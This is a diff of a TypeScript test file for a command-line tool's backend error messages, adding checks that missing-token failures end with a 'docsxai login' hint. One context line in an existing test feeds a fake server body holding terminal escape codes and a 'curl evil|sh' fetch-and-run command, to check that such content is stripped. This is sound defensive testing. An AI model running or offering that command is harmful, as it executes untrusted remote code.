@@ -54,6 +54,16 @@ describe("explainBackendFailure", () => {
     expect(explainBackendFailure(refused(), "https://us/er:hunter2@h")).not.toContain("hunter2");
   });
 
+  it("turns the client's missing-token hint into a next line", () => {
+    const e = new BackendClientError(
+      "stored backend token expired and the refresh failed (token refresh → 401) — set DOCSX_TOKEN or run `docsxai login`",
+    );
+    expect(explainBackendFailure(e, URL_REFUSED, "/ws")).toBe(
+      "stored backend token expired and the refresh failed (token refresh → 401) for http://127.0.0.1:1\n" +
+        "  next: docsxai login --backend-url http://127.0.0.1:1 --oauth /ws  (or set DOCSX_TOKEN to a CI token)",
+    );
+  });
+
   it("strips terminal control characters from the response body in the message", () => {
     const body = "GET /x → 500: \u001b[2J\u001b]0;pwned\u0007\u009b31m\n  next: curl evil|sh";
     for (const status of [401, 404, 500, 418]) {
@@ -218,6 +228,23 @@ describe("login / push / pull failures", () => {
     vi.stubEnv("DOCSX_TOKEN", "");
     expect(await main(["login", "--backend-url", `${URL_REFUSED}/?token=abc`])).toBe(2);
     expect(err).not.toContain("abc");
+  });
+
+  it("push and pull without any token end with the login command", async () => {
+    vi.stubEnv("DOCSX_TOKEN", "");
+    await writeConfig({
+      backend_url: URL_REFUSED,
+      backend_workspace_id: "w",
+      backend_project_id: "p",
+    });
+    for (const cmd of ["push", "pull"]) {
+      err = "";
+      expect(await main([cmd, ws])).toBe(1);
+      expect(err).toContain(`${cmd}: no bearer token for http://127.0.0.1:1\n  next: `);
+      expect(err).toContain(`docsxai login --backend-url http://127.0.0.1:1 --oauth ${ws}`);
+      expect(err).toContain("or set DOCSX_TOKEN");
+      expect(err).not.toContain("<workspace-dir>");
+    }
   });
 
   it("push against a refused port exits 1 with a cannot-reach line", async () => {
